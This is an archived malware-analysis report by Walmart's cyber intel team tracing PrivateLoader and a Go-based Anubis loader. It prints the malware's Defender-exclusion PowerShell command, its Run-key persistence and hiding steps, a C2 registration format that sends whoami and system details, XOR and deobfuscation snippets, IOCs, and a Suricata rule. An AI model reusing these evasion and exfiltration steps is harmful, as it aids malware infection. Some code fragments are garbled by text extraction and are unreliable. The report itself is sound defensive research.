{
    "id": "355502df-3524-47c9-ab7d-755fdeb3d5df",
    "created_at": "2023-01-12T15:10:32.836491Z",
    "updated_at": "2025-03-27T02:06:09.85329Z",
    "deleted_at": null,
    "sha1_hash": "aed60cc95221ff91f84279d631a27a4fe091d070",
    "title": "2022-02-14 - PrivateLoader to Anubis Loader",
    "authors": "",
    "file_creation_date": "2022-08-18T03:53:14Z",
    "file_modification_date": "2022-08-18T03:53:14Z",
    "file_size": 3363408,
    "plain_text": "# PrivateLoader to Anubis Loader\n\n**[medium.com/walmartglobaltech/privateloader-to-anubis-loader-55d066a2653e](https://medium.com/walmartglobaltech/privateloader-to-anubis-loader-55d066a2653e)**\n\nJason Reaves February 14, 2022\n\n[Jason Reaves](https://medium.com/@jason.reaves?source=post_page-----55d066a2653e--------------------------------)\n\nFeb 14\n\n\n6 min read\n\nBy: Jason Reaves and Joshua Platt\n\nIntel471 released a report[1] on a loader system being leveraged for distribution of various\ncrimeware malware families:\n\nQbot\nSmokeLoader\nTrickBot\n\n\n-----\n\nNanoCore RAT\nRedline stealer\nnjRat\nDjvu ransomware\nVidar stealer\nRemcos RAT\nTofsee spambot\nQRat\nLockbit ransomware\nDridex\nDanaBot\n\nThe diversity of the malware families led the Walmart Cyber Intel team to investigate further.\n\n## Infrastructure Analysis\n\nThe report mentioned an administrator panel located on the main command and control\nserver. The panel is named “EZCubePanel” by the author. The configuration options are\nfairly straightforward as laid out in the intel471 offering. The panel is configured to deliver\nlinks and browser extensions.\n\nLinks\nThe browser extensions did appear to be suspended at the time but were likely utilized in\nprevious campaigns.\n\n\n-----\n\nExtensions\nWhile the AdminLTE open source bootstrap template has been implemented to streamline\nthe UI process, the main functionality is implemented in php.\n\nCuriously, two geo tags appear to be linked to specific domains. The tag WW_5 is hard\ncoded for ezsoftware[.]ru, while the tag WW_8 is linked to vip-space[.]com & vip-files[.]com\n\nDomains\n\n## Installer\n\nThe private loader installer makes some interesting requests\n\n\n-----\n\n```\n941c7e39e8ea114465eadbd45aa709d55ad36ba551cbbf552e4c09b494a3a32d\n\n```\nAfter downloading a proxy list and contacting statistics.php, the payload link is encrypted with\na simple xor routine and delivered to the client.\n```\n>>> for i in range(len(b)):...  b[i] ^= 0x1d...>>>\nbbytearray(b'URL:https://cdn.discordapp.\ncom/attachments/910842184708792331/931520130133930034/PL_Client.mp')\n\n## Database\n\n```\nInfection counts show a large loader based system, which mimics some of the data\npresented in the report by Intel471.\n\nExtension infection stats:\n\nLogger infection stats from deliveries:\n\n## Loaders Loading Loaders\n\n\n-----\n\nAccording to the report, “Privacy tools” domains were utilized as a primary delivery for\nSmokeLoader. After checking out a few of the domains, some interesting stats were\ndiscovered. In November of 2021, over a period of 20 days there were over 125K loads. For\nDecember 2021, roughly 82K for pab2 and pab3.\n\n\n-----\n\nStats\nThe stat panel below appeared to show loads for the affiliate IDs pub1, pub2 and pub3.\nNearly 33K loads in nine days.\n\n\n-----\n\nCurrent Stats\nDuring our investigation we found other loaders delivered by PrivateLoader. Similar to what\nthe report stated. However, during some of the loader executions, we observed traffic that\ndid not appear to line up with the other stealers.\n\n\n-----\n\nAfter further inspection of the ‘build_dl’ traffic, one of the uncovered loader samples was\nactually developed in GoLang.\n\nUpon execution, the sample performs a check to see if it has admin privileges by attempting\nto open \\\\PHYSICALDRIVE:\n\n\n-----\n\nNext it takes a screenshot:\n\nAnd then proceeds to install itself:\n\nSome of the strings are obfuscated but the deobfuscation is simply subtracting one from\nevery character:\n\n\n-----\n\n```\ndef deobf(a): b bytearray(a) for i in range(len(b)):  b[i] 1 return b\n\n```\nSo now we can easily map out the install process steps, the malware leverages powershell\nto setup some exclusion paths:\n```\npowershell -Command Add-MpPreference -ExclusionPathon: AppData\\Local\\Temp \nAppData\\Local\\Microsoft\n\n```\nSets a runkey in Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run and the registry name\nand install name will be randomly generated from a hardcoded list of possibilities, install\nnames:\n```\nsvchostcsrssrundll32winlogonsmsstaskhostunsecappAdobeARMwinsysjuschedBCUwscntfyconhost\n\n```\nFor the registry names:\n```\nTrion SoftworksMystic EntertainmentMicrosoft PartnersClient-Server Runtime\nSubsystemNetworking Service\n\n```\nAfter then moving itself to the proper location it will use ‘attrib’ to set itself as a system file\nand hidden:\n```\nattrib +S +H\n\n```\nAlong with altering the HOSTS file: (edited for brevity)\n\n\n-----\n\nAnd flushing the DNS cache:\n```\nipconfig //flushdns\n\n```\nAfter installation the bot will connect to the C2 either over HTTP or TCP and register itself by\nsending various information back to the C2 via TCP:\n```\nmd5(cmd /c whoami) + “->Reg->[“ + Datetime + ”]->” + <cmd /c whoami> + “->” + <wmic\ncpu get name> + “->” + <wmic path win32_VideoController get name> + “->” + <cmd /C\nver> + “->” +Bot Build + <isAdmin()>\n\n```\n\n-----\n\nBot registration\nFor HTTP traffic an example can be seen below, the data sent to the server is obfuscated by\nadding two to every byte:\n```\nPOST /callback HTTP/1.1Host: redacted.x.x.xUser-Agent: Go-http-client/1.1ContentLength: 57Content-Type: application/x-www-form-urlencodedAccept-Encoding:\ngzipcallback=HktgYcnn%22Cffgf%22%2F%22lwuejgf&reginfo=WugtMKV\n\n```\nAfter registration, the bot will check for tasks to perform:\n\n\n-----\n\nTask parsing\n\nTask Commands\n\n## Panel\n\nThe panel refers to itself as ‘ANUBIS PANEL’ and contains roughly 20K bots. The bots\nappeared to be leveraged for crypto mining and distributing other malware.\n\n\n-----\n\n## PPI stats\n\nBy country:\n\n\n-----\n\nCountry map for installs:\n\nInstall stat slice from January:\n\n\n-----\n\nThe stats clearly show Anubis operators have been delivering thousands of installs each\nweek. In the case of Anubis, more than 500 unique binaries were distributed. The delivered\ntasks from Anubis also appear to similarly overlap with those of PrivateLoader.\n\nOver a period of 12 days, more than 11 GB of stealer logs were collected. While cracked\nsoftware is often overlooked in the world of CyberCrime, it is clearly underestimated as a\ntactic.\n\n## IOCs\n```\nPrivacy-tools-for-you-777[.]com2.56.59[.]42212.193.30[.]29212.193.30[.]45privacytools-for-you-782[.]comfile-coin-host-12[.]comhost-file-file0[.]comprivacy-tools-foryou-781[.]comcoin-file-file-19[.]comcoin-coin-file-9[.]comfile-file-host8[.]comdatahost-coin-8[.]comfile-file-host4[.]comhost-data-coin-11[.]comAnubis\nLoader:84b33d3b0c1e396758f9591e797f5b0029be3f6a752dc2bec2dc20a85d68addab7e657155c23d71\n\n```\nTCP traffic suricata rule:\n```\nalert tcp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"Anubis Registration\";\ncontent:\"|54 67 69 2f 40|\"; within:50;\ncontent:\"|4f6b6574717571687622596b7066717975225d586774756b7170|\"; classtype:trojanactivity; sid:9000001; rev:1;)\n\n```\n\n-----\n\n## References\n\n1: [https://intel471.com/blog/privateloader-malware](https://intel471.com/blog/privateloader-malware)\n\n2: https://www.fortinet.com/blog/threat-research/omicron-variant-lure-used-to-distributeredline-stealer\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-14 - PrivateLoader to Anubis Loader.pdf"
    ],
    "report_names": [
        "2022-02-14 - PrivateLoader to Anubis Loader.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536232,
    "ts_updated_at": 1743041169,
    "ts_creation_date": 1660794794,
    "ts_modification_date": 1660794794,
    "files": {
        "pdf": "https://archive.orkl.eu/aed60cc95221ff91f84279d631a27a4fe091d070.pdf",
        "text": "https://archive.orkl.eu/aed60cc95221ff91f84279d631a27a4fe091d070.txt",
        "img": "https://archive.orkl.eu/aed60cc95221ff91f84279d631a27a4fe091d070.jpg"
    }
}